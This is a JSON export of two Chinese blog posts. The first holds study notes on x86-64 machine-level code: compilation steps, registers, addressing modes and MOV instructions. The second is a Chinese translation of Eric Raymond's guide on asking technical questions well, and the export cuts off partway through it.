[{"content":"程序的机器级表示 编译器 基于编程语言的规则、操作系统的惯例、目标机器的指令集生成机器代码。 汇编代码 是机器代码的一种形式，它是机器代码的文本表示。 高级代码可移植性好，而汇编代码与特定机器密切相关。 下文讨论基于x86-64架构\n3.2 程序编码 1 $gcc -Og -o p p1.c p2.c -Og: 生成符合原始C代码整体结构的机器代码的优化等级。 Step1：C预处理器 插入所有用#include命令指定的文件，并拓展#define指定的宏 Step2：编译器产生两个源文件的汇编代码，分别为p1.s和p2.s。 Step3：汇编器将汇编代码转化成二进制目标代码文件p1.o和p2.o，是机器代码的一种形式，它包含二进制形式表示的所有指令，但还没有填入全局值的地址。 Step4：链接器将两个目标代码文件与实现库函数的代码合并，并产生最终的可执行代码文件p（-o后指定的文件名） 3.2.1 机器级代码 两种抽象模型：\n指令集架构/ISA：定义了处理器状态、指令的格式、指令对状态的影响。 虚拟地址：机器代码将内存看成一个按字节寻址的数组。 对机器代码可见的处理器状态：\n程序计数器/PC：在x86-64中用%rip表示，给出将要执行的下一条指令在内存中的地址。 整数寄存器文件：16个命名位置，存储64位值，存储地址或整数数据，保存临时数据或重要的程序状态。 条件码寄存器：保存最近执行的算术或逻辑指令的状态信息，如if和while语句。 向量寄存器：保存一个或多个整数或浮点数值。 C 语言中的数组和结构，在机器代码中用一组连续的字节来表示。 汇编代码不区分有符号数和无符号数，不区分指针的不同类型，不区分指针和整数。\n一条机器指令只执行一个非常基本的操作。\n程序内存 包含程序的可执行机器代码，操作系统需要的一些信息，栈和堆（用户分配的内存块）。\n使用虚拟地址来寻址，这些地址的高16位必须设0，操作系统负责管理虚拟地址空间，将虚拟地址翻译成实际处理器内存中的物理地址\n3.2.2 代码实例 1 2 3 4 5 6 7 //mstore.c long mult2(long, long); void multstore(long x, long y, long *dest){ long t = mult2(x, y); *dest = t; } 使用命令行生成汇编文件mstore.s\n1 $gcc -Og -S mstore.c 汇编代码包含\n1 2 3 4 5 6 pushq %rbx movq %rdx, %rbx call mult2 movq %rax, (%rbx) popq %rbx ret 使用命令行编译并汇编该代码产生二进制目标代码文件mstore.o\n1 $gcc -Og -c mstore.c 可以使用反汇编器查看机器代码的内容，在命令行中\n1 $objdump -d mstore.o 结果如下：\n1 2 3 4 5 6 7 Offset Bytes Equivalent assembly language 0: 53 push %rbx 1: 48 89 d3 mov %rdx, %rbx 4: e8 00 00 00 00 callq 9 \u0026lt;multstore+0x9\u0026gt; 9: 48 89 03 mov %rax, (%rbx) c: 5b pop %rbx d: c3 retq 机器代码与反汇编表示的特性：\nx86-64 的指令长度范围为1~15 字节。常用指令和操作数少的指令所需字节少。 从十六进制字节值到汇编指令，格式为：某个数字唯一地对应某个汇编指令，比如 mov 指令以 48 开头。 指令结尾的 \u0026lsquo;q\u0026rsquo; 是大小指示符，大多数情况下可以省略。 从源程序转换来的可执行目标文件中，除了程序过程的代码，还包含启动和终止程序的代码，与操作系统交互的代码。\n链接器的任务之一就是为函数调用找到匹配的函数的可执行代码的位置。\n3.2.3 关于格式的注解 所有以.开头的行都是指导汇编器和连接器工作的伪指令\n3.3 数据格式 数据类型 byte 字节 8位 word 字 16位数据 double word 双字 32位数据 quad word 四字 64位数据 对应的指令后缀：movb, movw, movl, movq。 这里说的都是整数，浮点数使用一组完全不同的指令和寄存器。\n3.4访问信息 16组64位值的通用目的寄存器,用来存储整数数据和指针。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 63 31 15 ... %rax %eax %ax \u0026lt;- 返回值 %rbx %ebx %bx \u0026lt;- 被调用者保存 %rcx %ecx %cx %rdx %edx %dx %rsi %esi %si %rdi %edi %di %rbp %ebp %bp \u0026lt;- 调用者保存 %rsp %esp %sp \u0026lt;- 栈指针 %r8 %r8d %r8w %r9 %r9d %r9w %r10 %r10d %r10w %r11 %r11d %r11w %r12 %r12d %r12w %r13 %r13d %r13w %r14 %r14d %r14w %r15 %r15d %r15w 低位操作的规则：\n将寄存器作为目标位置时，生成字节和字的指令会保持剩下的字节不变 生成双字的指令会把高位四字节置为 0 3.4.1 操作数指示符 操作数类型 立即数：表示常数值，书写方式是$后跟整数，如$-577, $0x1F 寄存器：将16个寄存器的低位1字节、2字节、4字节或8字节中的一个作为操作时，用$r_a$表示任意寄存器a，我们将寄存器集合看成一个数组R，用$R[r_a]$表示寄存器$r_a$的值 内存引用：根据有效地址访问某个地址位置。我们将内存看成一个很大的字节数组，用符号$M_b[Addr]$表示对存储在内存中从地址Addr开始的b个字节的引用。 寻址类型： $$Imm(r_b, r_i, s)$$ $Imm$-立即数偏移，$r_b$-基址寄存器，$r_i$-变址寄存器，$s$-比例因子，$s$必须是1,2,4,8。基址和变址寄存器必须是64位寄存器。有效地址被计算为$Imm+R[r_b]+R[r_i] \\cdot s$。 3.4.2 数据传送指令 MOV类 把数据从原位置复制到目的位置，不做任何变化\n1 2 3 4 5 6 7 指令 效果 描述 MOV S, D D←S 传送 movb 传送字节 movw 传送字 movl 传送双字 movq 传送四字 movabsq I,R R←I 传送绝对的四字 源操作数是一个立即数，存储在寄存器中或内存中；目的操作数要么是一个寄存器要么是一个内存地址。x86-64传输指令的两个操作数不能都指向内存位置，需要将原值加载到寄存器中，再将寄存器写入目的位置。\n这些指令的寄存器操作数可以是十六个寄存器有标号部分中的任意一个，寄存器部分大小必须与指令最后一个字符指定的大小匹配。\nMOVZ类 movz 系列和 movs 系列可以把较小的源值复制到较大的目的，目的都是寄存器。\nmovz 将目的寄存器剩余字节做零扩展，movs 做符号扩展\nmovz类：movzbw, movzbl, movzbq, movzwl, movzwq（movzbw 即从字节复制到字，其他类似）\nmovs类：movsbw, movsbl, movsbq, movswl, movswq, movslq, cltq\ncltq：没有操作数，将 eax 符号扩展到 rax，等价于 movslq %eax,%rax 3.4.3 数据传送示例 1 2 3 4 5 long exchage(long *xp, long y){ long x = *xp; *xp = y; return x; } 1 2 3 4 exchage: movq (%rdi), %rax movq %rsi, (%rdi) ret 这段编汇代码中有两点值得注意：\n\u0026ldquo;指针\u0026quot;其实就是地址。间接引用指针就是将指针放在一个寄存器中。 局部变量通常保存在寄存器中。 访问寄存器哔访问内存要快得多。 强制类型转换是通过 mov 指令实现的。 3.4.4 压入和弹出栈数据🌟 ","date":"2025-03-27T21:12:32+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA-1/","title":"程序的机器级表示 - 1"},{"content":"前言 本人 ISFJ，非常乐意为大家解决问题，特别是一些技术问题。但是要知道，这种问题通常来说不是很好解决。但很遗憾的是，提问者通常不能提供解决问题所需的一些信息，以下是推荐所有人阅读的提问的智慧以及我自己的一些建议。同时，在帮他人解决问题时我也会尽力遵循如何更好地回答问题\n选一个好一点的搜索引擎/AI。 有问题直接问就好，看到了有想法，能解决自然会回复。 代码有关的问题请带报错、需求和源码来。同时大家也应该学会看报错。 少看CSDN。 别人在帮助你，请你接受他的好意。 提问的智慧 How To Ask Questions The Smart Way\nCopyright © 2001,2006,2014 Eric S. Raymond, Rick Moen\n本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。\n原文网址：http://www.catb.org/~esr/faqs/smart-questions.html\nCopyleft 2001 by D.H.Grand(nOBODY/Ginux), 2010 by Gasolin, 2015 by Ryan Wu\n本中文指南是基于原文 3.10 版以及 2010 年由 Gasolin 所翻译版本的最新翻译；\n声明 许多项目在他们的使用协助/说明网页中链接了本指南，这么做很好，我们也鼓励大家都这么做。但如果你是负责管理这个项目网页的人，请在超链接附近的显著位置上注明：\n本指南不提供此项目的实际支持服务！\n我们已经深刻领教到少了上述声明所带来的痛苦。因为少了这点声明，我们不停地被一些白痴纠缠。这些白痴认为既然我们发布了这本指南，那么我们就有责任解决世上所有的技术问题。\n如果你是因为需要某些协助而正在阅读这本指南，并且最后离开是因为发现从本指南作者们身上得不到直接的协助，那么你就是我们所说的那些白痴之一。别问我们问题，我们只会忽略你。我们在这本指南中是教你如何从那些真正懂得你所遇到软件或硬件问题的人取得协助，而 99% 的情况下那不会是我们。除非你确定本指南的作者之一刚好是你所遇到的问题领域的专家，否则请不要打扰我们，这样大家都会开心一点。\n简介 在黑客的世界里，当你拋出一个技术问题时，最终是否能得到有用的回答，往往取决于你所提问和追问的方式。本指南将教你如何正确的提问以获得你满意的答案。\n不只是黑客，现在开放源代码（Open Source）软件已经相当盛行，你常常也可以由其他有经验的使用者身上得到好答案，这是件 好事 ；使用者比起黑客来，往往对那些新手常遇到的问题更宽容一些。然而，将有经验的使用者视为黑客，并采用本指南所提的方法与他们沟通，同样也是能从他们身上得到满意回答的最有效方式。\n首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发我们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，\u0026ldquo;好问题！\u0026ldquo;是诚挚的大力称赞。\n尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。\n我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 -– 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 失败者（撸瑟） （由于历史原因，我们有时把它拼作 lusers）。\n我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们了解这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们回答问题的风格是指向那些真正对此有兴趣并愿意主动参与解决问题的人，这一点不会变，也不该变。如果连这都变了，我们就是在降低做自己最擅长的事情上的效率。\n我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情的滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效的利用时间来回答赢家（winner）的问题。\n如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 \u0026ndash; 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。\n所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 \u0026ndash; 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。\n如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 \u0026ndash; 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。\n（欢迎对本指南提出改进意见。你可以 email 你的建议至 esr@thyrsus.com 或 respond-auto@linuxmafia.com。然而请注意，本文并非网络礼节的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议。）\n在提问之前 在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：\n尝试在你准备提问的论坛的旧文章中搜索答案。 尝试上网搜索以找到答案。 尝试阅读手册以找到答案。 尝试阅读常见问题文件（FAQ）以找到答案。 尝试自己检查或试验以找到答案 向你身边的强者朋友打听以找到答案。 如果你是程序开发者，请尝试阅读源代码以找到答案。 当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所 学到 的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。\n运用某些策略，比如先用 Google 搜索你所遇到的各种错误信息（既搜索 Google 论坛，也搜索网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句 我在 Google 中搜过下列句子但没有找到什么有用的东西 也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。\n别着急，不要指望几秒钟的 Google 搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。\n准备好你的问题，再将问题仔细的思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。\n小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着蠢问题…， 一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。\n绝不要自以为 够格 得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去 挣到 一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 \u0026ndash;一个有潜力能贡献社区经验的问题，而不仅仅是被动的从他人处索取知识。\n另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。谁能给点提示？、我的这个例子里缺了什么？以及我应该检查什么地方比请把我需要的确切的过程贴出来更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。\n当你提问时 慎选提问的论坛 小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：\n在与主题不合的论坛上贴出你的问题 在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然 在太多的不同新闻群组上重复转贴同样的问题（cross-post） 向既非熟人也没有义务解决你问题的人发送私人电邮 黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。\n因此，第一步是找到对的论坛。再说一次，Google 和其它搜索引擎还是你的朋友，用它们来找到与你遭遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链接。如果你的努力（包括 阅读 FAQ）都没有结果，网站上也许还有报告 Bug（Bug-reporting）的流程或链接，如果是这样，连过去看看。\n向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 \u0026ndash; 如果你不确定，那就向别处发送，或者压根别发。\n在选择论坛、新闻群组或邮件列表时，别太相信名字，先看看 FAQ 或者许可书以弄清楚你的问题是否切题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮助你归纳出更好的问题。\n别像机关枪似的一次\u0026quot;扫射\u0026quot;所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。\n搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix 或 Windows 操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之前什么也别问。\n一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助到许多人的问题。\n可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端 \u0026ndash; 已经好几次了，一些热门软件的作者从自己软件的支持中抽身出来，因为伴随而来涌入其私人邮箱的无用邮件变得无法忍受。\nStack Overflow 搜索，然后 在 Stack Exchange 问。\n近年来，Stack Exchange community 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放源码的项目。\n因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的机率某人已经问了一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。\nStack Exchange 已经成长到超过一百个网站，以下是最常用的几个站：\nSuper User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线之类的，请到这里。 Stack Overflow 是问写程序有关的问题。 Server Fault 是问服务器和网管相关的问题。 网站和 IRC 论坛 本地的使用者群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表）， 这些地方是开始提问的好首选，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。有广告赞助的 IRC 频道是公开欢迎提问的地方，通常可以即时得到回应。\n事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复 \u0026ldquo;用 我们的 版本\u0026rdquo;。\n在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。\n通过论坛或 IRC 频道来提供使用者支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。\n在使用 IRC 的时候，首先最好不要发布很长的问题描述，有些人称之为频道洪水。最好通过一句话的问题描述来开始聊天。\n第二步，使用项目邮件列表 当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用这种办法：\n任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题对整个项目群组来说太愚蠢，也不能成为骚扰个别开发者的理由。 向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。 大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其它人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。 如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。 如果一个项目既有\u0026quot;使用者\u0026rdquo; 也有\u0026quot;开发者\u0026rdquo;（或\u0026quot;黑客\u0026quot;）邮件列表或论坛，而你又不会动到那些源代码，那么就向\u0026quot;使用者\u0026quot;列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。\n然而，如果你 确信 你的问题很特别，而且在\u0026quot;使用者\u0026quot; 列表或论坛中几天都没有回复，可以试试前往\u0026quot;开发者\u0026quot;列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任何私有或半私有列表的好主意）\n如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。\n使用有意义且描述明确的标题 在邮件列表、新闻群组或论坛中，大约 50 字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的帮帮忙、跪求、急（更别说救命啊！！！！这样让人反感的话，用这种标题会被条件反射式地忽略）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而是在这点空间中使用极简单扼要的描述方式来提出问题。\n一个好标题范例是目标 -- 差异式的描述，许多技术支持组织就是这样做的。在目标部分指出是哪一个或哪一组东西有问题，在差异部分则描述与期望的行为不一致的地方。\n蠢问题：救命啊！我的笔电不能正常显示了！\n聪明问题：X.org 6.8.1 的鼠标游标会变形，某牌显卡 MV1005 芯片组。\n更聪明问题：X.org 6.8.1 的鼠标游标，在某牌显卡 MV1005 芯片组环境下 - 会变形。\n编写目标 -- 差异 式描述的过程有助于你组织对问题的细致思考。是什么被影响了？ 仅仅是鼠标游标或者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在 6.8.1 版中？ 是针对某牌显卡芯片组？或者只是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境 和 你遇到的问题。\n总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。\n如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像 Re: 测试 或者 Re: 新 bug 的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内容，能给新来的读者留下线索。\n对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程序，比如 mutt ，允许使用者按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发的消息。\n仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定讨论串。所以宁可发一个全新的邮件。\n在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们只会被正在查看该标题的人读到。所以，除非你 只想 在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。\n使问题容易回复 以请将你的回复寄到……来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，换个好点的；如果是操作系统不支持这种邮件程序，也换个好点的。\n在论坛，要求通过电子邮件回复是非常无礼的，除非你相信回复的信息可能比较敏感（而且有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如追踪此讨论串、有回复时发送邮件提醒等功能。\n用清晰、正确、精准并语法正确的语句 我们从经验中发现，粗心的提问者通常也会粗心的写程序与思考（我敢打包票）。回答粗心大意者的问题很不值得，我们宁愿把时间耗在别处。\n正确的拼字、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 \u0026ndash; 事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它 必须很 准确，而且有迹象表明你是在思考和关注问题。\n正确地拼写、使用标点和大小写，不要将its混淆为it's，loose搞成lose或者将discrete弄成discreet。不要全部用大写，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。Alan Cox 也许可以这样做，但你不行。）\n更白话的说，如果你写得像是个半文盲[译注：小白]，那多半得不到理睬。也不要使用即时通讯中的简写或火星文，如将的简化为ㄉ会使你看起来像一个为了少打几个键而省字的小白。更糟的是，如果像个小孩似地鬼画符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。\n如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚未被阅读就被直接删除的可能性降到最低。\n如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的： [译注：以下附上原文以供使用]\nEnglish is not my native language; please excuse typing errors.\n英文不是我的母语，请原谅我的错字或语法 If you speak $LANGUAGE, please email/PM me; I may need assistance translating my question.\n如果你说某语言，请寄信/私讯给我；我需要有人协助我翻译我的问题 I am familiar with the technical terms, but some slang expressions and idioms are difficult for me.\n我对技术名词很熟悉，但对于俗语或是特别用法比较不甚了解。 I\u0026rsquo;ve posted my question in $LANGUAGE and English. I\u0026rsquo;ll be glad to translate responses, if you only use one or the other.\n我把我的问题用某语言和英文写出来，如果你只用一种语言回答，我会乐意将其翻译成另一种。 使用易于读取且标准的文件格式发送问题 如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：\n使用纯文字而不是 HTML (关闭 HTML 并不难）。 使用 MIME 附件通常是可以的，前提是真正有内容（譬如附带的源代码或 patch），而不仅仅是邮件程序生成的模板（譬如只是信件内容的拷贝）。 不要发送一段文字只是一行句子但自动换行后会变成多行的邮件（这使得回复部分内容非常困难）。设想你的读者是在 80 个字符宽的终端机上阅读邮件，最好设置你的换行分割点小于 80 字。 但是，对一些特殊的文件 不要 设置固定宽度（譬如日志档案拷贝或会话记录）。数据应该原样包含，让回复者有信心他们看到的是和你看到的一样的东西。 在英语论坛中，不要使用Quoted-Printable MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持这种编码。当它们处理换行时，那些文本中四处散布的=20符号既难看也分散注意力，甚至有可能破坏内容的语意。 绝对，永远 不要指望黑客们阅读使用封闭格式编写的文档，像微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你家门口时你的反应一样。即便他们能够处理，他们也很厌恶这么做。 如果你从使用 Windows 的电脑发送电子邮件，关闭微软愚蠢的智能引号功能 （从[选项] \u0026gt; [校订] \u0026gt; [自动校正选项]，勾选掉智能引号单选框），以免在你的邮件中到处散布垃圾字符。 在论坛，勿滥用表情符号和HTML功能（当它们提供时）。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是对答案感兴趣。 如果你使用图形用户界面的邮件程序（如微软公司的 Outlook 或者其它类似的），注意它们的默认设置不一定满足这些要求。大多数这类程序有基于选单的查看源代码命令，用它来检查发送文件夹中的邮件，以确保发送的是纯文本文件同时没有一些奇怪的字符。\n精确的描述问题并言之有物 仔细、清楚地描述你的问题或 Bug 的症状。 描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：Fedora Core 4、Slackware 9.1等）。 描述在提问前你是怎样去研究和理解这个问题的。 描述在提问前为确定问题而采取的诊断步骤。 描述最近做过什么可能相关的硬件或软件变更。 尽可能的提供一个可以重现这个问题的可控环境的方法。 尽量去揣测一个黑客会怎样反问你，在你提问之前预先将黑客们可能遇到的问题回答一遍。\n以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。\nSimon Tatham 写过一篇名为《如何有效的报告 Bug》的出色文章。强力推荐你也读一读。\n话不在多而在精 你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。\n这样做的用处至少有三点。 第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加； 第二，简化问题使你更有可能得到 有用 的答案； 第三，在精炼你的 bug 报告的过程中，你很可能就自己找到了解决方法或权宜之计。\n别动辄声称找到 Bug 当你在使用软件中遇到问题，除非你非常、非常 的有根据，不要动辄声称找到了 Bug。提示：除非你能提供解决问题的源代码补丁，或者提供回归测试来表明前一版本中行为不正确，否则你都多半不够完全确信。这同样适用在网页和文件，如果你（声称）发现了文件的Bug，你应该能提供相应位置的修正或替代文件。\n请记得，还有许多其它使用者没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前已经做了这些，是吧？）。这也意味着很有可能是你弄错了而不是软件本身有问题。\n编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了 Bug，也就是在质疑他们的能力，即使你是对的，也有可能会冒犯到其中某部分人。当你在标题中嚷嚷着有Bug时，这尤其严重。\n提问时，即使你私下非常确信已经发现一个真正的 Bug，最好写得像是 你 做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有 Bug，维护者就会向你道歉，这总比你惹恼别人然后欠别人一个道歉要好一点。\n低声下气不能代替你的功课 有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 \u0026ndash; 低声下气：我知道我只是个可悲的新手，一个撸瑟，但...。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描述时更令人反感。\n别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。\n有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。\n描述问题症状而非你的猜测 告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。\n蠢问题\n我在编译内核时接连遇到 SIG11 错误， 我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？\n聪明问题\n我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6/233 CPU（威盛 Apollo VP2 芯片组）， 256MB Corsair PC133 SDRAM 内存，在编译内核时，从开机 20 分钟以后就频频产生 SIG11 错误， 但是在头 20 分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作 20 分钟。 所有内存都换过了，没有效果。相关部分的标准编译记录如下…。\n由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你：所有的诊断专家都来自密苏里州。 美国国务院的官方座右铭则是：让我看看（出自国会议员 Willard D. Vandiver 在 1899 